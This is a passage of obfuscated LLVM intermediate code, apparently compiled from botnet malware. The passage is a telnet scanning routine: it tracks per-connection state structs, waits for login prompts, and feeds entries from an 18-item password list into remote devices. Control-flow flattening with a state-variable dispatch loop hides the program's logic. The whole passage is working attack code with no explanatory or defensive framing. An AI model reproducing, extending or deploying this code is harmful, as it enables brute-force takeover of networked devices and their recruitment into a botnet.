  %787 = sext i32 %786 to i64
  %.reload244 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %788 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload244, i64 %787
  %789 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %788, i32 0, i32 8
  %790 = load i8*, i8** %789, align 8
  %791 = load i32, i32* %2, align 4
  %792 = sext i32 %791 to i64
  %.reload243 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload243, i64 %792
  %794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %793, i32 0, i32 7
  %795 = load i16, i16* %794, align 16
  %796 = zext i16 %795 to i32
  %797 = call i32 @readUntil(i32 %785, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %790, i32 1024, i32 %796)
  %798 = icmp ne i32 %797, 0
  %799 = select i1 %798, i32 1185476511, i32 1463146589
  store i32 %799, i32* %switchVar
  br label %loopEnd

; <label>:800:                                    ; preds = %loopEntry
  %801 = load i32, i32* %2, align 4
  %802 = sext i32 %801 to i64
  %.reload242 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %803 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload242, i64 %802
  %804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %803, i32 0, i32 6
  store i32 0, i32* %804, align 4
  %805 = load i32, i32* %2, align 4
  %806 = sext i32 %805 to i64
  %.reload241 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload241, i64 %806
  %808 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %807, i32 0, i32 7
  store i16 0, i16* %808, align 16
  %809 = load i32, i32* %2, align 4
  %810 = sext i32 %809 to i64
  %.reload240 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload240, i64 %810
  %812 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %811, i32 0, i32 8
  %813 = load i8*, i8** %812, align 8
  %814 = call i8* @strstr(i8* %813, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i32 0, i32 0)) #10
  %815 = icmp ne i8* %814, null
  %816 = select i1 %815, i32 -859735365, i32 -1202910762
  store i32 %816, i32* %switchVar
  br label %loopEnd

; <label>:817:                                    ; preds = %loopEntry
  %818 = load i32, i32* %2, align 4
  %819 = sext i32 %818 to i64
  %.reload239 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %820 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload239, i64 %819
  %821 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %820, i32 0, i32 2
  store i8 5, i8* %821, align 8
  store i32 854492463, i32* %switchVar
  br label %loopEnd

; <label>:822:                                    ; preds = %loopEntry
  %823 = load i32, i32* %2, align 4
  %824 = sext i32 %823 to i64
  %.reload238 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %825 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload238, i64 %824
  %826 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %825, i32 0, i32 2
  store i8 7, i8* %826, align 8
  store i32 854492463, i32* %switchVar
  br label %loopEnd

; <label>:827:                                    ; preds = %loopEntry
  %828 = load i32, i32* %2, align 4
  %829 = sext i32 %828 to i64
  %.reload237 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %830 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload237, i64 %829
  %831 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %830, i32 0, i32 8
  %832 = load i8*, i8** %831, align 8
  call void @llvm.memset.p0i8.i64(i8* %832, i8 0, i64 1024, i32 1, i1 false)
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:833:                                    ; preds = %loopEntry
  %834 = load i32, i32* %2, align 4
  %835 = sext i32 %834 to i64
  %.reload236 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload236, i64 %835
  %837 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %836, i32 0, i32 0
  %838 = load i32, i32* %837, align 16
  %839 = load i32, i32* %2, align 4
  %840 = sext i32 %839 to i64
  %.reload235 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload235, i64 %840
  %842 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %841, i32 0, i32 8
  %843 = load i8*, i8** %842, align 8
  %844 = load i32, i32* %2, align 4
  %845 = sext i32 %844 to i64
  %.reload234 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %846 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload234, i64 %845
  %847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %846, i32 0, i32 7
  %848 = load i16, i16* %847, align 16
  %849 = zext i16 %848 to i32
  %850 = call i32 @readUntil(i32 %838, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %843, i32 1024, i32 %849)
  %851 = icmp ne i32 %850, 0
  %852 = select i1 %851, i32 243381397, i32 -1727578017
  store i32 %852, i32* %switchVar
  br label %loopEnd

; <label>:853:                                    ; preds = %loopEntry
  %854 = load i32, i32* %2, align 4
  %855 = sext i32 %854 to i64
  %.reload233 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload233, i64 %855
  %857 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %856, i32 0, i32 6
  store i32 0, i32* %857, align 4
  %858 = load i32, i32* %2, align 4
  %859 = sext i32 %858 to i64
  %.reload232 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %860 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload232, i64 %859
  %861 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %860, i32 0, i32 7
  store i16 0, i16* %861, align 16
  %862 = load i32, i32* %2, align 4
  %863 = sext i32 %862 to i64
  %.reload231 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload231, i64 %863
  %865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %864, i32 0, i32 8
  %866 = load i8*, i8** %865, align 8
  %867 = call i8* @strstr(i8* %866, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0)) #10
  %868 = icmp ne i8* %867, null
  %869 = select i1 %868, i32 -1205934405, i32 1299943281
  store i32 %869, i32* %switchVar
  br label %loopEnd

; <label>:870:                                    ; preds = %loopEntry
  %871 = load i32, i32* %2, align 4
  %872 = sext i32 %871 to i64
  %.reload230 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload230, i64 %872
  %874 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %873, i32 0, i32 2
  store i8 5, i8* %874, align 8
  store i32 -1489624330, i32* %switchVar
  br label %loopEnd

; <label>:875:                                    ; preds = %loopEntry
  %876 = load i32, i32* %2, align 4
  %877 = sext i32 %876 to i64
  %.reload229 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %878 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload229, i64 %877
  %879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %878, i32 0, i32 2
  store i8 7, i8* %879, align 8
  store i32 -1489624330, i32* %switchVar
  br label %loopEnd

; <label>:880:                                    ; preds = %loopEntry
  %881 = load i32, i32* %2, align 4
  %882 = sext i32 %881 to i64
  %.reload228 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %883 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload228, i64 %882
  %884 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %883, i32 0, i32 8
  %885 = load i8*, i8** %884, align 8
  call void @llvm.memset.p0i8.i64(i8* %885, i8 0, i64 1024, i32 1, i1 false)
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:886:                                    ; preds = %loopEntry
  %887 = load i32, i32* %2, align 4
  %888 = sext i32 %887 to i64
  %.reload227 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %889 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload227, i64 %888
  %890 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %889, i32 0, i32 8
  %891 = load i8*, i8** %890, align 8
  %892 = call i8* @strstr(i8* %891, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0)) #10
  %893 = icmp ne i8* %892, null
  %894 = select i1 %893, i32 919551727, i32 1277119348
  store i32 %894, i32* %switchVar
  br label %loopEnd

; <label>:895:                                    ; preds = %loopEntry
  %896 = load i32, i32* %2, align 4
  %897 = sext i32 %896 to i64
  %.reload226 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %898 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload226, i64 %897
  %899 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %898, i32 0, i32 0
  %900 = load i32, i32* %899, align 16
  %901 = call i32 @sclose(i32 %900)
  %902 = load i32, i32* %2, align 4
  %903 = sext i32 %902 to i64
  %.reload225 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %904 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload225, i64 %903
  %905 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %904, i32 0, i32 2
  store i8 0, i8* %905, align 8
  %906 = load i32, i32* %2, align 4
  %907 = sext i32 %906 to i64
  %.reload224 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %908 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload224, i64 %907
  %909 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %908, i32 0, i32 3
  store i8 0, i8* %909, align 1
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:910:                                    ; preds = %loopEntry
  %911 = load i32, i32* %2, align 4
  %912 = sext i32 %911 to i64
  %.reload223 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %913 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload223, i64 %912
  %914 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %913, i32 0, i32 8
  %915 = load i8*, i8** %914, align 8
  %916 = call i8* @strstr(i8* %915, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0)) #10
  %917 = icmp ne i8* %916, null
  %918 = select i1 %917, i32 531723315, i32 -493840064
  store i32 %918, i32* %switchVar
  br label %loopEnd

; <label>:919:                                    ; preds = %loopEntry
  %920 = load i32, i32* %2, align 4
  %921 = sext i32 %920 to i64
  %.reload222 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %922 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload222, i64 %921
  %923 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %922, i32 0, i32 0
  %924 = load i32, i32* %923, align 16
  %925 = call i32 @sclose(i32 %924)
  %926 = load i32, i32* %2, align 4
  %927 = sext i32 %926 to i64
  %.reload221 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %928 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload221, i64 %927
  %929 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %928, i32 0, i32 2
  store i8 0, i8* %929, align 8
  %930 = load i32, i32* %2, align 4
  %931 = sext i32 %930 to i64
  %.reload220 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %932 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload220, i64 %931
  %933 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %932, i32 0, i32 3
  store i8 0, i8* %933, align 1
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:934:                                    ; preds = %loopEntry
  %935 = load i32, i32* %2, align 4
  %936 = sext i32 %935 to i64
  %.reload219 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %937 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload219, i64 %936
  %938 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %937, i32 0, i32 8
  %939 = load i8*, i8** %938, align 8
  %940 = call i8* @strstr(i8* %939, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0)) #10
  %941 = icmp ne i8* %940, null
  %942 = select i1 %941, i32 1838133364, i32 -1447478237
  store i32 %942, i32* %switchVar
  br label %loopEnd

; <label>:943:                                    ; preds = %loopEntry
  %944 = load i32, i32* %2, align 4
  %945 = sext i32 %944 to i64
  %.reload218 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %946 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload218, i64 %945
  %947 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %946, i32 0, i32 0
  %948 = load i32, i32* %947, align 16
  %949 = call i32 @sclose(i32 %948)
  %950 = load i32, i32* %2, align 4
  %951 = sext i32 %950 to i64
  %.reload217 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %952 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload217, i64 %951
  %953 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %952, i32 0, i32 2
  store i8 0, i8* %953, align 8
  %954 = load i32, i32* %2, align 4
  %955 = sext i32 %954 to i64
  %.reload216 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %956 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload216, i64 %955
  %957 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %956, i32 0, i32 3
  store i8 0, i8* %957, align 1
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:958:                                    ; preds = %loopEntry
  %959 = load i32, i32* %2, align 4
  %960 = sext i32 %959 to i64
  %.reload215 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %961 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload215, i64 %960
  %962 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %961, i32 0, i32 8
  %963 = load i8*, i8** %962, align 8
  %964 = call i8* @strstr(i8* %963, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0)) #10
  %965 = icmp ne i8* %964, null
  %966 = select i1 %965, i32 -1288950392, i32 -1975008968
  store i32 %966, i32* %switchVar
  br label %loopEnd

; <label>:967:                                    ; preds = %loopEntry
  %968 = load i32, i32* %2, align 4
  %969 = sext i32 %968 to i64
  %.reload214 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %970 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload214, i64 %969
  %971 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %970, i32 0, i32 0
  %972 = load i32, i32* %971, align 16
  %973 = call i32 @sclose(i32 %972)
  %974 = load i32, i32* %2, align 4
  %975 = sext i32 %974 to i64
  %.reload213 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %976 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload213, i64 %975
  %977 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %976, i32 0, i32 2
  store i8 0, i8* %977, align 8
  %978 = load i32, i32* %2, align 4
  %979 = sext i32 %978 to i64
  %.reload212 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %980 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload212, i64 %979
  %981 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %980, i32 0, i32 3
  store i8 0, i8* %981, align 1
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:982:                                    ; preds = %loopEntry
  %983 = load i32, i32* %2, align 4
  %984 = sext i32 %983 to i64
  %.reload211 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %985 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload211, i64 %984
  %986 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %985, i32 0, i32 8
  %987 = load i8*, i8** %986, align 8
  %988 = call i8* @strstr(i8* %987, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0)) #10
  %989 = icmp ne i8* %988, null
  %990 = select i1 %989, i32 -1608969130, i32 -1809941696
  store i32 %990, i32* %switchVar
  br label %loopEnd

; <label>:991:                                    ; preds = %loopEntry
  %992 = load i32, i32* %2, align 4
  %993 = sext i32 %992 to i64
  %.reload210 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %994 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload210, i64 %993
  %995 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %994, i32 0, i32 0
  %996 = load i32, i32* %995, align 16
  %997 = call i32 @sclose(i32 %996)
  %998 = load i32, i32* %2, align 4
  %999 = sext i32 %998 to i64
  %.reload209 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1000 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload209, i64 %999
  %1001 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1000, i32 0, i32 2
  store i8 0, i8* %1001, align 8
  %1002 = load i32, i32* %2, align 4
  %1003 = sext i32 %1002 to i64
  %.reload208 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1004 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload208, i64 %1003
  %1005 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1004, i32 0, i32 3
  store i8 0, i8* %1005, align 1
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:1006:                                   ; preds = %loopEntry
  %1007 = load i32, i32* %2, align 4
  %1008 = sext i32 %1007 to i64
  %.reload207 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1009 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload207, i64 %1008
  %1010 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1009, i32 0, i32 8
  %1011 = load i8*, i8** %1010, align 8
  %1012 = call i8* @strstr(i8* %1011, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0)) #10
  %1013 = icmp ne i8* %1012, null
  %1014 = select i1 %1013, i32 -86920576, i32 -547086818
  store i32 %1014, i32* %switchVar
  br label %loopEnd

; <label>:1015:                                   ; preds = %loopEntry
  %1016 = load i32, i32* %2, align 4
  %1017 = sext i32 %1016 to i64
  %.reload206 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1018 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload206, i64 %1017
  %1019 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1018, i32 0, i32 0
  %1020 = load i32, i32* %1019, align 16
  %1021 = call i32 @sclose(i32 %1020)
  %1022 = load i32, i32* %2, align 4
  %1023 = sext i32 %1022 to i64
  %.reload205 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1024 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload205, i64 %1023
  %1025 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1024, i32 0, i32 2
  store i8 0, i8* %1025, align 8
  %1026 = load i32, i32* %2, align 4
  %1027 = sext i32 %1026 to i64
  %.reload204 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1028 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload204, i64 %1027
  %1029 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1028, i32 0, i32 3
  store i8 0, i8* %1029, align 1
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:1030:                                   ; preds = %loopEntry
  %1031 = load i32, i32* %2, align 4
  %1032 = sext i32 %1031 to i64
  %.reload203 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1033 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload203, i64 %1032
  %1034 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1033, i32 0, i32 8
  %1035 = load i8*, i8** %1034, align 8
  %1036 = call i8* @strstr(i8* %1035, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0)) #10
  %1037 = icmp ne i8* %1036, null
  %1038 = select i1 %1037, i32 -574921288, i32 -211333897
  store i32 %1038, i32* %switchVar
  br label %loopEnd

; <label>:1039:                                   ; preds = %loopEntry
  %1040 = load i32, i32* %2, align 4
  %1041 = sext i32 %1040 to i64
  %.reload202 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1042 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload202, i64 %1041
  %1043 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1042, i32 0, i32 0
  %1044 = load i32, i32* %1043, align 16
  %1045 = call i32 @sclose(i32 %1044)
  %1046 = load i32, i32* %2, align 4
  %1047 = sext i32 %1046 to i64
  %.reload201 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1048 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload201, i64 %1047
  %1049 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1048, i32 0, i32 2
  store i8 0, i8* %1049, align 8
  %1050 = load i32, i32* %2, align 4
  %1051 = sext i32 %1050 to i64
  %.reload200 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1052 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload200, i64 %1051
  %1053 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1052, i32 0, i32 3
  store i8 0, i8* %1053, align 1
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:1054:                                   ; preds = %loopEntry
  %1055 = load i32, i32* %2, align 4
  %1056 = sext i32 %1055 to i64
  %.reload199 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1057 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload199, i64 %1056
  %1058 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1057, i32 0, i32 8
  %1059 = load i8*, i8** %1058, align 8
  %1060 = call i8* @strstr(i8* %1059, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0)) #10
  %1061 = icmp ne i8* %1060, null
  %1062 = select i1 %1061, i32 -1747522435, i32 880710635
  store i32 %1062, i32* %switchVar
  br label %loopEnd

; <label>:1063:                                   ; preds = %loopEntry
  %1064 = load i32, i32* %2, align 4
  %1065 = sext i32 %1064 to i64
  %.reload198 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1066 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload198, i64 %1065
  %1067 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1066, i32 0, i32 0
  %1068 = load i32, i32* %1067, align 16
  %1069 = call i32 @sclose(i32 %1068)
  %1070 = load i32, i32* %2, align 4
  %1071 = sext i32 %1070 to i64
  %.reload197 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1072 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload197, i64 %1071
  %1073 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1072, i32 0, i32 2
  store i8 0, i8* %1073, align 8
  %1074 = load i32, i32* %2, align 4
  %1075 = sext i32 %1074 to i64
  %.reload196 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1076 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload196, i64 %1075
  %1077 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1076, i32 0, i32 3
  store i8 0, i8* %1077, align 1
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:1078:                                   ; preds = %loopEntry
  store i32 790788414, i32* %switchVar
  br label %loopEnd

; <label>:1079:                                   ; preds = %loopEntry
  store i32 53140470, i32* %switchVar
  br label %loopEnd

; <label>:1080:                                   ; preds = %loopEntry
  store i32 1657236078, i32* %switchVar
  br label %loopEnd

; <label>:1081:                                   ; preds = %loopEntry
  store i32 -289241668, i32* %switchVar
  br label %loopEnd

; <label>:1082:                                   ; preds = %loopEntry
  store i32 -107742555, i32* %switchVar
  br label %loopEnd

; <label>:1083:                                   ; preds = %loopEntry
  store i32 -1507373892, i32* %switchVar
  br label %loopEnd

; <label>:1084:                                   ; preds = %loopEntry
  store i32 773139881, i32* %switchVar
  br label %loopEnd

; <label>:1085:                                   ; preds = %loopEntry
  %1086 = load i32, i32* %2, align 4
  %1087 = sext i32 %1086 to i64
  %.reload195 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1088 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload195, i64 %1087
  %1089 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1088, i32 0, i32 8
  %1090 = load i8*, i8** %1089, align 8
  %1091 = call i64 @strlen(i8* %1090) #10
  %1092 = trunc i64 %1091 to i16
  %1093 = load i32, i32* %2, align 4
  %1094 = sext i32 %1093 to i64
  %.reload194 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1095 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload194, i64 %1094
  %1096 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1095, i32 0, i32 7
  store i16 %1092, i16* %1096, align 16
  store i32 1567044329, i32* %switchVar
  br label %loopEnd

; <label>:1097:                                   ; preds = %loopEntry
  store i32 297314666, i32* %switchVar
  br label %loopEnd

; <label>:1098:                                   ; preds = %loopEntry
  %1099 = load i32, i32* %2, align 4
  %1100 = sext i32 %1099 to i64
  %.reload193 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload193, i64 %1100
  %1102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1101, i32 0, i32 6
  %1103 = load i32, i32* %1102, align 4
  %1104 = add i32 %1103, 10
  %1105 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1106 = icmp ult i32 %1104, %1105
  %1107 = select i1 %1106, i32 -719009651, i32 579272820
  store i32 %1107, i32* %switchVar
  br label %loopEnd

; <label>:1108:                                   ; preds = %loopEntry
  %1109 = load i32, i32* %2, align 4
  %1110 = sext i32 %1109 to i64
  %.reload192 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload192, i64 %1110
  %1112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1111, i32 0, i32 0
  %1113 = load i32, i32* %1112, align 16
  %1114 = call i32 @sclose(i32 %1113)
  %1115 = load i32, i32* %2, align 4
  %1116 = sext i32 %1115 to i64
  %.reload191 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload191, i64 %1116
  %1118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1117, i32 0, i32 2
  store i8 0, i8* %1118, align 8
  %1119 = load i32, i32* %2, align 4
  %1120 = sext i32 %1119 to i64
  %.reload190 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload190, i64 %1120
  %1122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1121, i32 0, i32 3
  store i8 1, i8* %1122, align 1
  store i32 579272820, i32* %switchVar
  br label %loopEnd

; <label>:1123:                                   ; preds = %loopEntry
  store i32 2003215975, i32* %switchVar
  br label %loopEnd

; <label>:1124:                                   ; preds = %loopEntry
  %1125 = load i32, i32* %2, align 4
  %1126 = sext i32 %1125 to i64
  %.reload189 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload189, i64 %1126
  %1128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1127, i32 0, i32 0
  %1129 = load i32, i32* %1128, align 16
  %1130 = load i32, i32* %2, align 4
  %1131 = sext i32 %1130 to i64
  %.reload188 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload188, i64 %1131
  %1133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1132, i32 0, i32 5
  %1134 = load i8, i8* %1133, align 1
  %1135 = zext i8 %1134 to i64
  %1136 = getelementptr inbounds [18 x i8*], [18 x i8*]* @passwords, i64 0, i64 %1135
  %1137 = load i8*, i8** %1136, align 8
  %1138 = load i32, i32* %2, align 4
  %1139 = sext i32 %1138 to i64
